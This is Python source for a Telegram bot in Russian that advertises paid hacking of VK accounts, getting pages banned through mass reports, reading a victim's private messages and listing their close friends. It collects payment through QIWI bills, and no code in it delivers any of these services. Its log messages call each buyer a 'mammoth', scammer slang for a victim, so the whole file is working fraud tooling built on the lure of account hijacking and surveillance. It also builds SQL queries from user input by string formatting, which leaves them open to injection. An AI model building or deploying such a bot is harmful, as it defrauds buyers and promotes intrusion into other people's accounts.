import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import FSMContext
import requests
import sqlite3
from lxml import etree
from pyqiwip2p import QiwiP2P
from pyqiwip2p.p2p_types import QiwiCustomer, QiwiDatetime
import random
import json

logs = "" #Чат id чата с логами
token = "" #Токен бота
price = ["400", "250", "100", "50"] #Цены на товары массивом
code = "vk.com/" #Домен вк для проверки ссылок
auth_key = "" #секретный ключ qiwi, получить тут https://qiwi.com/p2p-admin/transfers/api
lifetime = 10 #Сколько будет жить форма оплаты (в минутах)
mylist = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] #Массив данных из которого генерирую коментарий
p2p = QiwiP2P(auth_key=auth_key)

bot = Bot(token=token)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
logging.basicConfig(level=logging.INFO)

class UserState(StatesGroup):
    ref = State()

def connect():
    conn = sqlite3.connect("base.db")
    cursor = conn.cursor()
    return conn, cursor
conn, cursor = connect()

@dp.message_handler(commands="start")
async def start(message: types.Message):
    cursor.execute(f"SELECT * FROM Users WHERE chatid = {message.chat.id}")
    row = cursor.fetchone()
    conn.commit()
    if row == None:
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        buttons = [
        types.InlineKeyboardButton(text="⏭Пропустить⏭")
        ]
        keyboard.add(*buttons)
        cursor.execute(f"INSERT INTO Users(chatid, ref) VALUES ({message.chat.id}, '0')")
        conn.commit()
        await UserState.ref.set()
        await bot.send_message(message.chat.id, f"🌐Добро Пожаловать {message.chat.first_name}\n🔍Кто тебя пригласил:\n🧠Пример ввода: @andrey22", reply_markup=keyboard)
        @dp.message_handler(state=UserState.ref)
        async def get_username(message: types.Message, state: FSMContext):
            if message.text == "⏭Пропустить⏭":
                await state.update_data(refer=message.text)
                await state.finish()
                await bot.send_message(logs, f"Мамонт в боте!\nTG ID: {message.chat.id}\nUsername: @{message.chat.username}\nNickname: {message.chat.first_name}\nПригласил: Пропущено")
                await bot.send_photo(message.chat.id, photo=open(f'photo/vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
                pass
            else:
                await state.update_data(refer=message.text)
                cursor.execute(f"UPDATE Users SET ref = '{message.text}' WHERE chatid = {message.chat.id}")
                conn.commit()
                await bot.send_message(logs, f"Мамонт в боте!\nTG ID: {message.chat.id}\nUsername: @{message.chat.username}\nNickname: {message.chat.first_name}\nПригласил: {message.text}")
                await bot.send_photo(message.chat.id, photo=open(f'photo/vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
                await state.finish()
                pass
    else:
        await bot.send_photo(message.chat.id, photo=open(f'photo/vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
        pass
        
@dp.message_handler(content_types=["text"])
async def ref(message: types.Message):
    if code in message.text:
        pars = requests.get(f"https://vkdia.com/pages/fake-vk-profile/registration-date?vkId={message.text}")
        decod = json.loads(pars.text)
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        buttons = [
            types.InlineKeyboardButton(text=f"👨‍💻Взломать страницу - {price[0]} руб", callback_data="vzlom"),
            types.InlineKeyboardButton(text=f"⛔️Заблокировать страницу - {price[1]} руб", callback_data="ban"),
            types.InlineKeyboardButton(text=f"🚀Прочитать переписки - {price[2]} руб", callback_data="check"),
            types.InlineKeyboardButton(text=f"👥Посмотреть важных друзей - {price[3]} руб", callback_data="friends")
            ]
        keyboard.add(*buttons)
        await bot.send_photo(message.chat.id, photo=open(f'photo/func.jpg', 'rb'), caption=f"👁<b>Данные о странице:</b>\n\n<b>ВК ID:</b> {decod['vkId']}\n<b>Имя:</b> {decod['firstName']}\n<b>Фамилия:</b> {decod['lastName']}\n\nВыберите действие:", reply_markup=keyboard, parse_mode='html')
        pass
    else:
        await bot.send_message(message.chat.id, f"Ссылка неверного формата!\nПример ссылки: vk.com/durov")
        pass

@dp.callback_query_handler(text="vzlom")
async def hack(call: types.CallbackQuery):
    cursor.execute(f"SELECT ref FROM Users WHERE chatid = {call.message.chat.id}")
    reff = cursor.fetchone()
    if reff[0] == "0":
        referal = "Пропущено"
    else:
        referal = reff[0]
    comm = random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist)
    await bot.send_message(logs, f"Мамонт на оплате!\nTG ID: {call.message.chat.id}\nUsername: @{call.message.chat.username}\nNickname: {call.message.chat.first_name}\nПригласил: {referal}\nСумма: {price[0]}\nКоментарий: {comm}")
    await call.message.answer("⏳Создаю ссылку на оплату...")
    bill = p2p.bill(amount=price[0], lifetime=lifetime, comment=comm)
    keyboard = types.InlineKeyboardMarkup()
    url_button = types.InlineKeyboardButton(text="Перейти к оплате", url=bill.pay_url)
    keyboard.add(url_button)
    await call.message.answer(f"<b>Сумма:</b> {price[0]}\n<b>Форма оплаты будет активна:</b> {lifetime} Минут\n<b>Услуга:</b> Взлом страницы\n<b>Описание:</b> После оплаты в течении 5 минут бот\nвышлет вам данные для авторизации на странице жертвы.", reply_markup=keyboard, parse_mode='html')
    pass

@dp.callback_query_handler(text="ban")
async def ban(call: types.CallbackQuery):
    cursor.execute(f"SELECT ref FROM Users WHERE chatid = {call.message.chat.id}")
    reff = cursor.fetchone()
    if reff[0] == "0":
        referal = "Пропущено"
    else:
        referal = reff[0]
    comm = random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist)
    await bot.send_message(logs, f"Мамонт на оплате!\nTG ID: {call.message.chat.id}\nUsername: @{call.message.chat.username}\nNickname: {call.message.chat.first_name}\nПригласил: {referal}\nСумма: {price[1]}\nКоментарий: {comm}")
    await call.message.answer("⏳Создаю ссылку на оплату...")
    bill = p2p.bill(amount=price[1], lifetime=lifetime, comment=comm)
    keyboard = types.InlineKeyboardMarkup()
    url_button = types.InlineKeyboardButton(text="Перейти к оплате", url=bill.pay_url)
    keyboard.add(url_button)
    await call.message.answer(f"<b>Сумма:</b> {price[1]}\n<b>Форма оплаты будет активна:</b> {lifetime} Минут\n<b>Услуга:</b> Блокировка страницы\n<b>Описание:</b> После оплаты в течении часа страница будет заблокирована\nза множественные сообщения о нарушении.", reply_markup=keyboard, parse_mode='html')
    pass

@dp.callback_query_handler(text="check")
async def check(call: types.CallbackQuery):
    cursor.execute(f"SELECT ref FROM Users WHERE chatid = {call.message.chat.id}")
    reff = cursor.fetchone()
    if reff[0] == "0":
        referal = "Пропущено"
    else:
        referal = reff[0]
    comm = random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist)
    await bot.send_message(logs, f"Мамонт на оплате!\nTG ID: {call.message.chat.id}\nUsername: @{call.message.chat.username}\nNickname: {call.message.chat.first_name}\nПригласил: {referal}\nСумма: {price[1]}\nКоментарий: {comm}")
    await call.message.answer("⏳Создаю ссылку на оплату...")
    bill = p2p.bill(amount=price[2], lifetime=lifetime, comment=comm)
    keyboard = types.InlineKeyboardMarkup()
    url_button = types.InlineKeyboardButton(text="Перейти к оплате", url=bill.pay_url)
    keyboard.add(url_button)
    await call.message.answer(f"<b>Сумма:</b> {price[2]}\n<b>Форма оплаты будет активна:</b> {lifetime} Минут\n<b>Услуга:</b> Чтение переписок\n<b>Описание:</b> После оплаты в течении 15 минут бот вам пришел .zip архив\nсодержащий все переписки жертвы в текстовом формате.", reply_markup=keyboard, parse_mode='html')
    pass

@dp.callback_query_handler(text="friends")
async def friends(call: types.CallbackQuery):
    cursor.execute(f"SELECT ref FROM Users WHERE chatid = {call.message.chat.id}")
    reff = cursor.fetchone()
    if reff[0] == "0":
        referal = "Пропущено"
    else:
        referal = reff[0]
    comm = random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist) + random.choice(mylist)
    await bot.send_message(logs, f"Мамонт на оплате!\nTG ID: {call.message.chat.id}\nUsername: @{call.message.chat.username}\nNickname: {call.message.chat.first_name}\nПригласил: {referal}\nСумма: {price[1]}\nКоментарий: {comm}")
    await call.message.answer("⏳Создаю ссылку на оплату...")
    bill = p2p.bill(amount=price[3], lifetime=lifetime, comment=comm)
    keyboard = types.InlineKeyboardMarkup()
    url_button = types.InlineKeyboardButton(text="Перейти к оплате", url=bill.pay_url)
    keyboard.add(url_button)
    await call.message.answer(f"<b>Сумма:</b> {price[3]}\n<b>Форма оплаты будет активна:</b> {lifetime} Минут\n<b>Услуга:</b> Узнать важных\n<b>Описание:</b> После оплаты в течении 5 минут бот отправит список важных друзей жертвы.", reply_markup=keyboard, parse_mode='html')
    pass
    
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)